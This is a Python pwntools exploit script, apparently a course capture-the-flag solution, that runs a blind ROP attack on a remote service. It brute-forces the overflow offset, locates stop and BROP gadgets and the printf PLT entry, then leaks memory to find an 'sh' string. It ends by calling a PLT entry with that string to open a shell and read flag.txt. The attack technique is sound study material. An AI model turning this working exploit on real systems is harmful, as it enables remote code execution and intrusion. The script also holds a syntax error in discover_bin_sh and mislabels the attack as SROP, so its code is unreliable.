from pwn import *

context.arch = "amd64"

def start():
    return remote("cse4850-brop-2.chals.io", 443, ssl=True, sni="cse4850-brop-2.chals.io")

OFFSET_MIN = 1
OFFSET_MAX = 100
STOP_GADGET_MIN = 0x400849
STOP_GADGET_MAX = STOP_GADGET_MIN + 100
BROP_GADGET_MIN = 0x4009e6
BROP_GADGET_MAX = BROP_GADGET_MIN + 100
PLT_MIN = 0x4006c0
PLT_MAX = PLT_MIN + 20
DATA_MIN = 0x400a30
DATA_MAX = DATA_MIN + 0x100

def check_addr(addr):
    bad_addr = ["0a"]
    for b in bad_addr:
        if b in hex(addr):
            return False
    return True

def find_offset():
    for i in range(OFFSET_MIN, OFFSET_MAX):
        log.info('\tTrying to crash program with %i bytes' % i)
        with context.quiet:
            p = start()
            p.recvuntil(b"choice >>>")
            p.sendline(b"5")
            p.recvuntil(b"feedback >>>")
            p.sendline(cyclic(i))
            try:
                resp = p.recvall(timeout=0.5)
                if b"Thank" not in resp:
                    return int(i/8) * 8

            except EOFError:
                return int(i/8)*8

def find_stop_gadget():
    for i in range(STOP_GADGET_MIN, STOP_GADGET_MAX):
        if check_addr(i):
            log.info('\tTesting for stop gadget at 0x%x' % i)
            with context.quiet:
                p = start()
                chain = cyclic(offset)
                chain += p64(i)
                chain += p64(i+1)
                p.recvuntil(b"choice >>>")
                p.sendline(b"5")
                p.sendlineafter(b'feedback >>>', chain)
                try:
                    resp = p.recvline()
                    if b'\n' in resp:
                        return i
                except EOFError:
                    pass

def find_brop_gadget():
    for i in range(BROP_GADGET_MIN, BROP_GADGET_MAX):
        log.info('\tTesting for brop gadget at 0x%x' % i)
        with context.quiet:
            p = start()
            chain = cyclic(offset)
            chain += p64(stop_gadget)
            chain += p64(i)
            chain += p64(0xdeadbeef)*6
            chain += p64(stop_gadget)
            chain += p64(stop_gadget+1)
            p.recvuntil(b"choice >>>")
            p.sendline(b"5")
            p.sendlineafter(b'feedback >>>', chain)
            try:
                resp = p.recvline()
                if resp:
                    return i
            except EOFError:
                pass

def find_printf_plt():
    for i in range(PLT_MIN , PLT_MAX):
        log.info('\tTesting for printf PLT at 0x%x' % i)
        with context.quiet:
            p = start()
            chain = cyclic(offset)
            chain += p64(ret)
            chain += p64(pop_rdi)
            chain += p64(i)
            chain += p64(i)
            p.recvuntil(b"choice >>>")
            p.sendline(b"5")
            p.sendlineafter(b'feedback >>>', chain)
            try:
                resp = p.recvline()
                if b'\xff' in resp:
                    return i
            except EOFError:
                pass

def discover_bin_sh():
    addr = DATA_MIN
    while (addr < DATA_MAX):
        try:
            with context.quiet:
                p = start()
                chain = cyclic(offset)
                chain += p64(ret)
                chain += p64(pop_rdi)
                chain += p64(addr)
                chain += p64(printf_plt)

                p.recvuntil(b"choice >>>")
                p.sendline(b"5")
                p.sendlineafter(b'feedback >>>', chain)
                data = p.recvline()
                if data:
                    print("\tAddr: %s, Data: %s" % (hex(addr-1), data))
                    if (b'sh' in data): binsh = (addr-1)+data.index(b'sh')
                        return binsh
                addr += len(data)
        except:
            addr += 1

def sys_exec():
    for addr in range(PLT_MIN, PLT_MAX):
        p = start()
        chain = cyclic(offset)
        chain += p64(ret)
        chain += p64(pop_rdi)
        chain += p64(bin_sh)
        chain += p64(addr)
        p.recvuntil(b"choice >>>")
        p.sendline(b"5")
        p.sendlineafter(b'feedback >>>', chain)
        p.sendline(b"cat flag.txt")
        p.interactive()
        p.close()

offset = find_offset()

stop_gadget = find_stop_gadget()
log.info('Discovered stop gadget = 0x%x' % stop_gadget)

brop_gadget = find_brop_gadget()
log.info('brop gagdet  = 0x%x' % brop_gadget)
pop_rdi = brop_gadget + 13
ret = pop_rdi + 1
log.info('pop rdi, ret = 0x%x' %pop_rdi)
log.info('ret = 0x%x' %ret)

printf_plt = find_printf_plt()
log.info('printf plt entry = 0x%x' % printf_plt)

bin_sh = discover_bin_sh()
log.info('bin sh  = 0x%x' % bin_sh)

log.info('throwing SROP exploit at the ghost')
sys_exec()
